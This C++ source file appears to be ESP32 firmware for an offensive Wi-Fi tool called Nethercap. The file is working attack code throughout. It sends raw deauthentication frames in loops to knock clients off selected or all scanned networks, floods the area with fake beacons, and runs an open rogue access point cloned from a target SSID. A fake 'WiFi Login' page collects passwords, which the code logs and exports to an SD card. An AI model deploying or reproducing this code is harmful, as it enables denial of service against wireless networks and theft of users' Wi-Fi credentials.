#include "nethercap_core.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

NethercapCore nethercap;

static uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

static uint8_t beaconPacket[60] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
    0x00, 0x00
};

void NethercapCore::init() {
    running = false;
    deauthRunning = false;
    rogueAPActive = false;
    beaconSpamActive = false;
    selectedTargetCount = 0;
    totalDeauthFrames = 0;
    deauthInterval = 10;
    targets.clear();
    credentials.clear();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    targetSSID = eeprom.getNethercapSsid();
    logger.log(LOG_INFO, "NETHERCAP", "Core initialized");
}

void NethercapCore::start() {
    if (running) return;
    running = true;
    logger.log(LOG_INFO, "NETHERCAP", "Started");
    buzzer.success();
}

void NethercapCore::stop() {
    if (!running) return;
    stopDeauth();
    stopRogueAP();
    stopBeaconSpam();
    running = false;
    logger.log(LOG_INFO, "NETHERCAP", "Stopped");
    buzzer.click();
}

bool NethercapCore::isRunning() { return running; }

void NethercapCore::startDeauthSelected() {
    bool hasSelected = false;
    for (auto &t : targets) {
        if (t.selected) { hasSelected = true; break; }
    }
    if (!hasSelected) {
        logger.log(LOG_WARN, "NETHERCAP", "No target selected");
        buzzer.error();
        return;
    }
    if (deauthRunning) return;
    deauthRunning = true;
    lastDeauthFrame = 0;
    totalDeauthFrames = 0;
    logger.log(LOG_INFO, "NETHERCAP", "Deauth started on selected targets");
    buzzer.beep(1000, 100);
}

void NethercapCore::stopDeauth() {
    deauthRunning = false;
    logger.log(LOG_INFO, "NETHERCAP", ("Deauth stopped. Frames: " + String(totalDeauthFrames)).c_str());
    buzzer.click();
}

bool NethercapCore::isDeauthRunning() { return deauthRunning; }
unsigned long NethercapCore::getTotalDeauthFrames() { return totalDeauthFrames; }

void NethercapCore::sendDeauthFrame(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&deauthPacket[4], bssid, 6);
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    deauthPacket[24] = 0x07;
    deauthPacket[25] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, 26, false);
    totalDeauthFrames++;
}

void NethercapCore::startBeaconSpam() {
    if (beaconSpamActive) return;
    beaconSpamActive = true;
    lastBeaconSpam = 0;
    logger.log(LOG_INFO, "NETHERCAP", "Beacon spam started");
    buzzer.click();
}

void NethercapCore::stopBeaconSpam() {
    beaconSpamActive = false;
    logger.log(LOG_INFO, "NETHERCAP", "Beacon spam stopped");
    buzzer.click();
}

bool NethercapCore::isBeaconSpamActive() { return beaconSpamActive; }

void NethercapCore::sendBeaconFrame(const char* ssid, uint8_t channel, uint8_t* bssid) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[100];
    memcpy(packet, beaconPacket, sizeof(beaconPacket));
    uint8_t fakeBSSID[6];
    if (bssid == nullptr) {
        randomMac(fakeBSSID);
        bssid = fakeBSSID;
    }
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    packet[38] = 0x00;
    packet[39] = ssidLen;
    for (int i = 0; i < ssidLen; i++) {
        packet[40 + i] = ssid[i];
    }
    int packetLen = 40 + ssidLen;
    esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLen, false);
}

int NethercapCore::scanNetworks() {
    WiFi.scanDelete();
    int n = WiFi.scanNetworks();
    targets.clear();
    for (int i = 0; i < n; i++) {
        Target t;
        t.ssid = WiFi.SSID(i);
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = WiFi.channel(i);
        t.rssi = WiFi.RSSI(i);
        t.selected = false;
        t.lastDeauth = 0;
        t.deauthCount = 0;
        targets.push_back(t);
    }
    WiFi.scanDelete();
    logger.log(LOG_INFO, "NETHERCAP", ("Found " + String(targets.size()) + " networks").c_str());
    return targets.size();
}

int NethercapCore::getTargetCount() { return targets.size(); }
Target* NethercapCore::getTargets() { return targets.data(); }

void NethercapCore::selectTarget(int index) {
    if (index >= 0 && index < (int)targets.size() && !targets[index].selected) {
        targets[index].selected = true;
        selectedTargetCount++;
    }
}

void NethercapCore::deselectTarget(int index) {
    if (index >= 0 && index < (int)targets.size() && targets[index].selected) {
        targets[index].selected = false;
        selectedTargetCount--;
    }
}

void NethercapCore::selectAllTargets() {
    for (auto &t : targets) { t.selected = true; }
    selectedTargetCount = targets.size();
}

void NethercapCore::deselectAllTargets() {
    for (auto &t : targets) { t.selected = false; }
    selectedTargetCount = 0;
}

void NethercapCore::setTargetSSID(const char* ssid) {
    targetSSID = String(ssid);
    eeprom.setNethercapSsid(ssid);
}

void NethercapCore::startRogueAP(const char* targetSSID) {
    if (rogueAPActive) stopRogueAP();

    String ssid;
    if (targetSSID != nullptr && strlen(targetSSID) > 0) {
        ssid = String(targetSSID);
    } else {
        ssid = eeprom.getNethercapSsid();
    }
    if (ssid.length() == 0) {
        ssid = DEFAULT_NETHERCAP_SSID;
    }

    rogueSSID = ssid;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(rogueSSID.c_str(), NULL);
    rogueAPActive = true;
    logger.log(LOG_INFO, "NETHERCAP", ("Rogue AP started: " + rogueSSID + " (open)").c_str());
    buzzer.success();
}

void NethercapCore::stopRogueAP() {
    if (!rogueAPActive) return;
    WiFi.softAPdisconnect(true);
    rogueAPActive = false;
    rogueSSID = "";
    logger.log(LOG_INFO, "NETHERCAP", "Rogue AP stopped");
    buzzer.click();
}

bool NethercapCore::isRogueAPActive() { return rogueAPActive; }
String NethercapCore::getRogueAPSSID() { return rogueSSID; }
int NethercapCore::getConnectedClients() {
    if (!rogueAPActive) return 0;
    return WiFi.softAPgetStationNum();
}

int NethercapCore::getCredentialCount() { return credentials.size(); }
Credential* NethercapCore::getCredentials() { return credentials.data(); }

void NethercapCore::clearCredentials() {
    credentials.clear();
    logger.log(LOG_INFO, "NETHERCAP", "Credentials cleared");
}

bool NethercapCore::exportCredentials(const char* filename) {
    if (!sdCard.isReady()) {
        logger.log(LOG_ERROR, "NETHERCAP", "SD Card not ready");
        return false;
    }
    String path = String(SD_CAPTURE_DIR) + "/" + filename;
    String content = "";
    for (auto &c : credentials) {
        content += "SSID: " + c.ssid + " PASS: " + c.password + " BSSID: " + c.bssid + " TIME: " + c.timestamp + "\n";
    }
    if (sdCard.writeFile(path.c_str(), content.c_str())) {
        logger.log(LOG_INFO, "NETHERCAP", "Exported to " + path);
        return true;
    }
    return false;
}

void NethercapCore::processCredential(String ssid, String pass, String bssid) {
    Credential c;
    c.ssid = ssid;
    c.password = pass;
    c.bssid = bssid;
    c.timestamp = logger.getTimestamp();
    credentials.push_back(c);
    logger.logCapture("NETHERCAP", ("SSID:" + ssid + " PASS:" + pass).c_str());
    buzzer.alarm();
}

void NethercapCore::update() {
    if (!running) return;

    if (deauthRunning) {
        if (millis() - lastDeauthFrame >= (unsigned long)deauthInterval) {
            lastDeauthFrame = millis();
            bool hasSelected = false;
            for (auto &t : targets) {
                if (t.selected) {
                    hasSelected = true;
                    sendDeauthFrame(t.bssid, t.channel);
                    t.deauthCount++;
                }
            }
            if (!hasSelected) {
                stopDeauth();
            }
        }
    }

    if (beaconSpamActive) {
        if (millis() - lastBeaconSpam >= (unsigned long)beaconSpamInterval) {
            lastBeaconSpam = millis();
            String fakeSSID = "Network_" + String(random(1000, 9999));
            sendBeaconFrame(fakeSSID.c_str(), random(1, 13), nullptr);
        }
    }
}

String NethercapCore::bssidToString(uint8_t* bssid) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(buf);
}

void NethercapCore::randomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;
}

String NethercapCore::getIndexHTML() {
    return "<html><head><title>MRJ V2</title></head><body><h1>MRJ V2 - Nethercap</h1><p>Dashboard</p></body></html>";
}

String NethercapCore::getLoginHTML() {
    return "<html><head><title>WiFi Login</title></head><body><h1>Login</h1><form><input type='text' name='ssid'><input type='password' name='password'><input type='submit'></form></body></html>";
}
